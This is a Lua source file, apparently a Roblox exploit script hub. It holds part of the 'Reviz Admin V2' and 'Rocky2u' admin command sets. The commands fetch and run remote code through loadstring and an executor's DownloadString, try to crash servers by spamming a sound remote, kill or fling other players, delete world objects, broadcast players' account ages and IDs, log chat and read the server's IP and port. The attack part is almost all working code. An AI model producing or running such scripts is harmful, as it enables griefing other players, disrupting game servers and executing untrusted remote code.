						r[i].Transparency = vis
						end
					end
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 10) == ("hypertotal") then
			loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Success!";
			Text = "HyperTotal GUI Loaded!";
			})
		end
		if string.sub(CMDBAR.Text, 1, 4) == ("cmds") then
			CMDSFRAME.Visible = true
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("rmeshhats") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("blockhats") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("rmeshtool") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("blocktool") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("spinner") then
			local p = Instance.new("RocketPropulsion")
			p.Parent = lplayer.Character.HumanoidRootPart
			p.Name = "Spinner"
			p.Target = lplayer.Character["Left Arm"]
			p:Fire()
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Spinner enabled";
			Text = "Type ;nospinner to disable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("nospinner") then
			lplayer.Character.HumanoidRootPart.Spinner:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("reachd") then
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
				if v:isA("Tool") then
					local a = Instance.new("SelectionBox",v.Handle)
					a.Adornee = v.Handle
					v.Handle.Size = Vector3.new(0.5,0.5,60)
					v.GripPos = Vector3.new(0,0,0)
					lplayer.Character.Humanoid:UnequipTools()
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Reach applied!";
			Text = "Applied to equipped sword. Use ;noreach to disable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("reach ") then
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
				if v:isA("Tool") then
					local a = Instance.new("SelectionBox",v.Handle)
					a.Name = "Reach"
					a.Adornee = v.Handle
					v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(CMDBAR.Text, 7)))
					v.GripPos = Vector3.new(0,0,0)
					lplayer.Character.Humanoid:UnequipTools()
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Reach applied!";
			Text = "Applied to equipped sword. Use ;noreach to disable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("noreach") then
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
				if v:isA("Tool") then
					v.Handle.Reach:Destroy()
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Reach removed!";
			Text = "Removed reach from equipped sword.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("rkill ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				wait(0.1)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("tp me ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("cbring ") then
			if (string.sub(CMDBAR.Text, 8)) == "all" or (string.sub(CMDBAR.Text, 8)) == "All" or (string.sub(CMDBAR.Text, 8)) == "ALL" then
				cbringall = true
			else
				for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
					brplr = v.Name
				end
			end
			cbring = true
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("uncbring") then
			cbring = false
			cbringall = false
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("swap ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				local function tp(player,player2)
				local char1,char2=player.Character,player2.Character
				if char1 and char2 then
				char1:MoveTo(char2.Head.Position)
				end
				end
				wait(0.1)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				tp(lplayer, game:GetService("Players")[v.Name])
				wait(0.4)
				lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("glitch ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
				lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(0.3)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(0.4)
				b = Instance.new("BodyForce")
				b.Parent = lplayer.Character.HumanoidRootPart
				b.Name = "Glitch"
				b.Force = Vector3.new(100000000,5000,0)
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools needed!";
				Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("unglitch") then
			lplayer.Character.HumanoidRootPart.Glitch:Destroy()
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
			b = Instance.new("BodyForce")
			b.Parent = lplayer.Character.HumanoidRootPart
			b.Name = "unGlitch"
			b.Force = Vector3.new(0,-5000000,0)
			wait(2)
			lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("grespawn") then
			lplayer.Character.Humanoid.Health = 0
			wait(1)
			lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
			lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("explorer") then
			loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Success!";
			Text = "DEX Explorer has loaded.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("anim ") then
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..(string.sub(CMDBAR.Text, 6))
			local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
			track:Play(.1, 1, 1)
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("animgui") then
			loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Success!";
			Text = "Energize Animations GUI has loaded.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("savepos") then
			saved = lplayer.Character.HumanoidRootPart.CFrame
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Position Saved";
			Text = "Use ;loadpos to return to saved position.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("loadpos") then
			lplayer.Character.HumanoidRootPart.CFrame = saved
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("bang ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				local Anim2 = Instance.new("Animation")
				Anim2.AnimationId = "rbxassetid://148840371"
				local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
				track2:Play(.1, 1, 1)
				bplrr = v.Name
				banpl = true
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("unbang") then
			banpl = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("bringmod ") then
			local function bringmodw()
			for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
			if obj.Name == (string.sub(CMDBAR.Text, 10)) then
			for i,ch in pairs(obj:GetDescendants()) do
			if (ch:IsA("BasePart")) then
			ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
			ch.CanCollide = false
			ch.Transparency = 0.7
			wait()
			ch.CFrame = lplayer.Character["Left Leg"].CFrame
			wait()
			ch.CFrame = lplayer.Character["Right Leg"].CFrame
			wait()
			ch.CFrame = lplayer.Character["Head"].CFrame
			end
			end
			end
			end
			end
			while wait() do
				bringmodw()
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "BringMod";
			Text = "BringMod enabled.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("respawn") then
			local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
			local hum = Instance.new('Humanoid', mod)
			local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
			lplayer.Character = mod
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("shutdown") then
			game:GetService'RunService'.Stepped:Connect(function()
			pcall(function()
			    for i,v in pairs(game:GetService'Players':GetPlayers()) do
			        if v.Character ~= nil and v.Character:FindFirstChild'Head' then
			            for _,x in pairs(v.Character.Head:GetChildren()) do
			                if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
			            end
			        end
			    end
			end)
			end)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Attempting Shutdown";
			Text = "Shutdown Attempt has begun.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("delobj ") then
			objtodel = (string.sub(CMDBAR.Text, 8))
			for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
				if v.Name == objtodel then
					v:Destroy()
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("getplrs") then
			for i,v in pairs(game:GetService("Players"):GetPlayers())do
				print(v)
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Printed";
			Text = "Players have been printed to console. (F9)";
			})
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("deldecal") then
			for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
				if (v:IsA("Decal")) then
					v:Destroy()
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 10) == ("opfinality") then
			loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Success!";
			Text = "OpFinality GUI has loaded.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("remotes") then
			remotes = true
			added = true
			game.DescendantAdded:connect(function(rmt)
			if added == true then
			if remotes == true then 
			if rmt:IsA("RemoteEvent") then
			print("A RemoteEvent was added!")
			print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
			print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
			end end end
			end)
			game.DescendantAdded:connect(function(rmtfnctn)
			if added == true then
			if remotes == true then 
			if rmtfnctn:IsA("RemoteFunction") then
			warn("A RemoteFunction was added!")
			warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
			print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
			end end end
			end)
			
			game.DescendantAdded:connect(function(bndfnctn)
			if added == true then
			if binds == true then 
			if bndfnctn:IsA("BindableFunction") then
			print("A BindableFunction was added!")
			print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
			print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
			end end end
			end)
			
			game.DescendantAdded:connect(function(bnd)
			if added == true then
			if binds == true then 
			if bnd:IsA("BindableEvent") then
			warn("A BindableEvent was added!")
			warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
			print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
			end end end
			end)
			
			
			if binds == true then
			for i,v in pairs(game:GetDescendants()) do
			if v:IsA("BindableFunction") then
			print(" game." .. v:GetFullName() .. " | BindableFunction")
			print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
			end end
			for i,v in pairs(game:GetDescendants()) do
			if v:IsA("BindableEvent") then
			warn(" game." .. v:GetFullName() .. " | BindableEvent")
			print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
			end end
			else
			print("Off")
			end
			if remotes == true then
			for i,v in pairs(game:GetDescendants()) do
			if v:IsA("RemoteFunction") then
			warn(" game." .. v:GetFullName() .. " | RemoteFunction")
			print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
			end end
			wait()
			for i,v in pairs(game:GetDescendants()) do
			if v:IsA("RemoteEvent") then
			print(" game." .. v:GetFullName() .. " | RemoteEvent")
			print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
			end end
			else
			print("Off")
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Printing Remotes";
			Text = "Type ;noremotes to disable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("noremotes") then
			remotes = false
			added = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Printing Remotes Disabled";
			Text = "Type ;remotes to enable.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("tpdefault") then
			spin = false
			followed = false
			traill = false
			noclip = false
			annoying = false
			hwalk = false
			cbringing = false
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("stopsit") then
			stopsitting = true
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("gosit") then
			stopsitting = false
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("version") then
			print(adminversion)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Version";
			Text = adminversion;
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("clicktp") then
			clickgoto = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Click TP";
			Text = "Press E to teleport to mouse position";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("noclicktp") then
			clickgoto = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Click TP";
			Text = "Click TP has been disabled.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("toolson") then
			gettingtools = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools Enabled";
			Text = "Automatically colleting tools dropped.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("toolsoff") then
			gettingtools = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Tools Disabled";
			Text = "Click TP has been disabled.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("delcmdbar") then
			ScreenGui:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 5) == ("reset") then
			lplayer.Character.Head:Destroy()
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("state ") then
			statechosen = string.sub(CMDBAR.Text, 7)
			changingstate = true
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("gravity ") then
			game:GetService("Workspace").Gravity = string.sub(CMDBAR.Text, 9)
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("looprhats") then
		removingmeshhats = true
		end
		if string.sub(CMDBAR.Text, 1, 11) == ("unlooprhats") then
			removingmeshhats = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("looprtool") then
			removingmeshtool = true
		end
		if string.sub(CMDBAR.Text, 1, 11) == ("unlooprtool") then
			removingmeshtool = false
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("givetool ") then
			for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
				if v:IsA("Tool") then
					for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
						v.Parent = player.Character
					end
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 4) == ("age ") then
			for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
			end
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("id ") then
			for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 4))) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
			end
		end
		if string.sub(CMDBAR.Text, 1, 5) == (".age ") then
			for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = player.AccountAge.." Days";
				Text = "Account age of "..player.Name;
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 4) == (".id ") then
			for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = player.UserId.." ID";
				Text = "Account ID of "..player.Name;
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("gameid") then
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Game ID";
			Text = "Game ID: ".. game.GameId;
			})
		end
		if string.sub(CMDBAR.Text, 1, 3) == ("pgs") then
			local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
			if pgscheck == true then
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "PGSPhysicsSolverEnabled";
				Text = "PGS is Enabled!";
				})
			else
				game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "PGSPhysicsSolverEnabled";
				Text = "PGS is Disabled!";
				})
			end
		end
		if string.sub(CMDBAR.Text, 1, 11) == ("removeinvis") then
			for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
				if v:IsA("Part") then
					if v.Transparency == 1 then
						if v.Name ~= "HumanoidRootPart" then
							v:Destroy()
						end
					end
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("removefog") then
			game:GetService("Lighting").FogStart = 0
			game:GetService("Lighting").FogEnd = 9999999999999
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("disable") then
			lplayer.Character.Humanoid.Parent = lplayer
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("enable") then
			lplayer.Humanoid.Parent = lplayer.Character
		end
		if string.sub(CMDBAR.Text, 1, 13) == ("givealltools ") then
			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
				if v:IsA("Tool") then
					v.Parent = lplayer.Character
					wait()
					for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 14))) do
						v.Parent = player.Character
					end
				end
			end
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("flyspeed ") then
			speedfly = string.sub(CMDBAR.Text, 10)
			wait()
			change()
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("carpet ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
				local Anim3 = Instance.new("Animation")
				Anim3.AnimationId = "rbxassetid://282574440"
				local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
				track3:Play(.1, 1, 1)
				bplrr = v.Name
				banpl = true
			end
		end
		if string.sub(CMDBAR.Text, 1, 8) == ("uncarpet") then
			banpl = false
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("stare ") then
			for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
				staring = true
				stareplr = v
			end
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("unstare") then
			staring = false
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("logchat") then
			chatlogs = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "LogChat enabled";
			Text = "Now logging all player chat.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 9) == ("unlogchat") then
			chatlogs = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "LogChat disabled";
			Text = "Stopped logging all player chat.";
			})
		end
		if string.sub(CMDBAR.Text, 1, 6) == ("fixcam") then
			game:GetService("Workspace").CurrentCamera:Destroy()
			wait(0.1)
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
			game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
			lplayer.CameraMinZoomDistance = 0.5
			lplayer.CameraMaxZoomDistance = 400
			lplayer.CameraMode = "Classic"
		end
		if string.sub(CMDBAR.Text, 1, 7) == ("unstate") then
			changingstate = false
		end
		CMDBAR.Text = ""
	end
end)

wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Loaded successfully!";
	Text = "Reviz Admin V2 by illremember";
})
wait(0.1)
print("Reviz Admin V2 loaded!")
if game:GetService("Workspace").FilteringEnabled == true then
	warn("FE is Enabled (Filtering Enabled)")
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "FE is Enabled";
		Text = "Filtering Enabled. Enjoy using Reviz Admin!";
	})
else
	warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "FE is Disabled";
		Text = "Filtering Disabled. Consider using a different admin script.";
	})
end

local intro = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
intro.Parent = game:GetService("CoreGui")
Frame.Parent = intro
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.Size = UDim2.new(1, 0, 0, 300)
Frame.Position = UDim2.new(0, 0, -0.4, 0)
ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 0, 0, 0)
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=1542162618"
Frame:TweenPosition(UDim2.new(0, 0, 0.2, 0), "Out", "Elastic", 3)
wait(3.01)
Frame:TweenPosition(UDim2.new(0, 0, 1.5, 0), "Out", "Elastic", 5)
wait(5.01)
intro:Destroy()
end)

b:Button("rocky2u",function()
   --Rocky2u admin - fixed by Autumn (thanks <3), updated for Raindrop by 3dsboy08

--[[
  ____            _          ____        _        ____ __  __ ____      
 |  _ \ ___   ___| | ___   _|___ \ _   _( )___   / ___|  \/  |  _ \ ___ 
 | |_) / _ \ / __| |/ / | | | __) | | | |// __| | |   | |\/| | | | / __|
 |  _ < (_) | (__|   <| |_| |/ __/| |_| | \__ \ | |___| |  | | |_| \__ \
 |_| \_\___/ \___|_|\_\\__, |_____|\__,_| |___/  \____|_|  |_|____/|___/
                       |___/                                            
--]]

local ADMINS = {}
local BANS = {}

function _G.ADD_ADMIN(ID) table.insert(ADMINS, ID) end
function _G.ADD_BAN(ID) table.insert(BANS, ID) end

local VERSION = '1.8.0'
local UPDATED = '3/15/2017'
local CHANGELOG = {
	' * updated ;nolimbs',
	' * updated ;rhats',
	' - removed ;sword (LoadAsset)',
	' * updated ;punish and ;unpunish',
	' * updated ;loopheal',
	' + added ;loopkill & ;unloopkill'
}

local CREDITS = [[
 Rocky2u - lol
 veinyrox - ;crash and ;shutdown
 Harkinian - half of the message function
 Moon - cmd bar addon idea
]]

local _CORE = game:GetService('CoreGui')
local _LIGHTING = game:GetService('Lighting')
local _NETWORK = game:GetService('NetworkClient')
local _PLAYERS = game:GetService('Players')

local LP = _PLAYERS.LocalPlayer
local MOUSE = LP:GetMouse()

local SERVER_LOCKED = false
local SHOWING_MESSAGE = false

local SERVICES = {}
SERVICES.EVENTS = {}

local COMMANDS = {}
local STD = {}
local JAILED = {}
local KICKS = {}
local LOOPED_H = {}
local LOOPED_K = {}

local C_PREFIX = ';'
local SPLIT = ' '

local IP = ''
local PORT = ''

if _NETWORK:FindFirstChild('ClientReplicator') then
	IP = _NETWORK.ClientReplicator.MachineAddress
	PORT = _NETWORK.ClientReplicator.Port
end

local NEW = loadstring(Raindrop:DownloadString("https://raw.githubusercontent.com/RobloxLabs/internal-code/master/library-scripts/RbxUtility-60595411.lua"))().Create

function UPDATE_CHAT(PLAYER) local C = PLAYER.Chatted:connect(function(M) if CHECK_ADMIN(PLAYER) then DEXECUTE(M, PLAYER) end end) table.insert(SERVICES.EVENTS, C) end
function STD.TABLE(T, V) if not T then return false end for i,v in pairs(T) do if v == V then return true end end return false end
function STD.ENDAT(S, V) local SF = S:find(V) if SF then return S:sub(0, SF - string.len(V)), true else return S, false end end
function CHECK_ADMIN(PLAYER) if FIND_IN_TABLE(ADMINS, PLAYER.userId) then return true elseif PLAYER.userId == LP.userId then return true end end
function FCOMMAND(COMMAND) for i,v in pairs(COMMANDS) do if v.N:lower() == COMMAND:lower() or STD.TABLE(v.A, COMMAND:lower()) then return v end end end
function GCOMMAND(M) local CMD, HS = STD.ENDAT(M:lower(), SPLIT) if HS then return {CMD, true} else return {CMD, false} end end
function GPREFIX(STRING) if STRING:sub(1, string.len(C_PREFIX)) == C_PREFIX then return {'COMMAND', string.len(C_PREFIX) + 1} end return end
function GARGS(STRING) local A = {} local NA = nil local HS = nil local S = STRING repeat NA, HS = STD.ENDAT(S:lower(), SPLIT) if NA ~= '' then table.insert(A, NA) S = S:sub(string.len(NA) + string.len(SPLIT) + 1) end until not HS return A end
function GCAPARGS(STRING) local A = {} local NA = nil local HS = nil local S = STRING repeat NA, HS = STD.ENDAT(S, SPLIT) if NA ~= '' then table.insert(A, NA) S = S:sub(string.len(NA) + string.len(SPLIT) + 1) end until not HS return A end
function ECOMMAND(STRING, SPEAKER) repeat if STRING:find('  ') then STRING = STRING:gsub('  ', ' ') end until not STRING:find('  ') local SCMD, A, CMD SCMD = GCOMMAND(STRING) CMD = FCOMMAND(SCMD[1]) if not CMD then return end A = STRING:sub(string.len(SCMD[1]) + string.len(SPLIT) + 1) local ARGS = GARGS(A) CA = GCAPARGS(A) pcall(function() CMD.F(ARGS, SPEAKER) end) end
function DEXECUTE(STRING, SPEAKER) if not CHECK_ADMIN(SPEAKER) then return end STRING = STRING:gsub('/e ', '') local GP = GPREFIX(STRING) if not GP then return end STRING = STRING:sub(GP[2]) if GP[1] == 'COMMAND' then ECOMMAND(STRING, SPEAKER) end end

function GLS(LOWER, START) local AA = '' for i,v in pairs(CA) do if i > START then if AA ~= '' then AA = AA .. ' ' .. v else AA = AA .. v end end end if not LOWER then return AA else return string.lower(AA) end end
function C3(R, G, B) return Color3.new(R/255, G/255, B/255) end
function GET_MASS(A, B) B = 0 for i,v in pairs(A:GetChildren()) do if v:IsA('BasePart') then B = B + v:GetMass() end GET_MASS(v) end return B end

local STUFF = '[ Rocky2u\'s CMDs ] : '
local NOCLIP, JESUSFLY, SWIM = false, false, false

_PLAYERS.PlayerAdded:connect(function(PLAYER)
	if SERVER_LOCKED then PLAYER.CharacterAdded:connect(function() table.insert(KICKS, PLAYER) return end) end
	if FIND_IN_TABLE(BANS, PLAYER.userId) then PLAYER.CharacterAdded:connect(function() table.insert(KICKS, PLAYER) return end) end
	UPDATE_CHAT(PLAYER)
	if CHECK_ADMIN(PLAYER) then PLAYER.CharacterAdded:connect(function() game.Chat:Chat(PLAYER.Character.Head, STUFF .. 'Welcome, you\'re an admin!') end) end
end)

game:GetService('RunService').Stepped:connect(function()
	for i,v in pairs(_PLAYERS:GetPlayers()) do
		if FIND_IN_TABLE(KICKS, v) then KICK(v) end
